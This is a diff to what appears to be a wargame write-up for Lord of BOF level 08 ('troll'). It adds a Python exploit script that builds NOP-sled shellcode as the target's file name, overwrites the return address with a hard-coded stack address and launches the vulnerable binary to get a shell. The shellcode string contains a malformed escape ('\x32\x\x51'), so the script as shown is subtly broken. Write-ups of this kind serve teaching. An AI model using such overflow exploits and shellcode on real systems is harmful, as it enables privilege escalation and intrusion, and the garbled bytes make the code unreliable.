@@ -3,7 +3,7 @@ title: "[LOB]Level08. troll"
 tags: [LOB, writeup]
 author: eli_ez3r
 key: 20180829
-modify_date: 2019-10-14
+modify_date: 2019-11-13
 article_header:
   type: cover
   image:
@@ -203,3 +203,29 @@ buffer 배열의 40byte와 SFP 4byte를 NOP Code로 덮어씌우고 RET부분에
 
 -----
 
+```python
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\x\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
+
+target = "\x90"*100 + shellcode
+#target = "A"*100+"S"*48
+
+shellcode_addr = 0xbffffc78
+
+payload = "\x90"*44
+payload = append(p32(shellcode_addr))
+
+pid = os.fork()
+
+if pid == 0:
+        os.execv(target, (target, payload))
+else:
+        os.waitpid(pid, 0)
+```
+
+-----
